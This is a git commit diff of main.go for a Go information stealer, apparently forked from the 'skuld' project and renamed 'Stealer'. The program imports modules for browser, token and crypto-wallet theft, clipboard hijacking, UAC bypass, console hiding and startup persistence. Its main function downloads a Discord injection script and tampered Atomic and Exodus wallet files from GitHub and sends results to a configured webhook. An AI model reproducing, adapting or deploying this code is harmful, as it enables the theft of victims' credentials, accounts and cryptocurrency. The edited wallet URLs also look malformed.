cfb312dc79166d18e839e3f390fc30d3c79bca08
Tom <87285009+CoomedOnPeppy@users.noreply.github.com>
2025-02-15 23:08:35 +0200

    Update main.go

--- main.go
+++ main.go
@@ -1,21 +1,21 @@
 package main
 
 import (
-	"github.com/hackirby/skuld/modules/browsers"
-	"github.com/hackirby/skuld/modules/clipper"
-	"github.com/hackirby/skuld/modules/commonfiles"
-	"github.com/hackirby/skuld/modules/discodes"
-	"github.com/hackirby/skuld/modules/discordinjection"
-	"github.com/hackirby/skuld/modules/fakeerror"
-	"github.com/hackirby/skuld/modules/games"
-	"github.com/hackirby/skuld/modules/hideconsole"
-	"github.com/hackirby/skuld/modules/startup"
-	"github.com/hackirby/skuld/modules/system"
-	"github.com/hackirby/skuld/modules/tokens"
-	"github.com/hackirby/skuld/modules/uacbypass"
-	"github.com/hackirby/skuld/modules/wallets"
-	"github.com/hackirby/skuld/modules/walletsinjection"
-	"github.com/hackirby/skuld/utils/program"
+	"github.com/CoomedOnPeppy/Stealer/modules/browsers"
+	"github.com/CoomedOnPeppy/Stealer/modules/clipper"
+	"github.com/CoomedOnPeppy/Stealer/modules/commonfiles"
+	"github.com/CoomedOnPeppy/Stealer/modules/discodes"
+	"github.com/CoomedOnPeppy/Stealer/modules/discordinjection"
+	"github.com/CoomedOnPeppy/Stealer/modules/fakeerror"
+	"github.com/CoomedOnPeppy/Stealer/modules/games"
+	"github.com/CoomedOnPeppy/Stealer/modules/hideconsole"
+	"github.com/CoomedOnPeppy/Stealer/modules/startup"
+	"github.com/CoomedOnPeppy/Stealer/modules/system"
+	"github.com/CoomedOnPeppy/Stealer/modules/tokens"
+	"github.com/CoomedOnPeppy/Stealer/modules/uacbypass"
+	"github.com/CoomedOnPeppy/Stealer/modules/wallets"
+	"github.com/CoomedOnPeppy/Stealer/modules/walletsinjection"
+	"github.com/CoomedOnPeppy/Stealer/utils/program"
 )
 
 func main() {
@@ -47,12 +47,12 @@ func main() {
 	}
 
 	go discordinjection.Run(
-		"https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
+		"https://raw.githubusercontent.com/CoomedOnPeppy/discord-injection/main/injection.js",
 		CONFIG["webhook"].(string),
 	)
 	go walletsinjection.Run(
-		"https://github.com/hackirby/wallets-injection/raw/main/atomic.asar",
-		"https://github.com/hackirby/wallets-injection/raw/main/exodus.asar",
+		"https://github.com/CoomedOnPeppy/wallets-injection/wallets-injection/raw/main/atomic.asar",
+		"https://github.com/CoomedOnPeppy/wallets-injection/wallets-injection/raw/main/exodus.asar",
 		CONFIG["webhook"].(string),
 	)
 
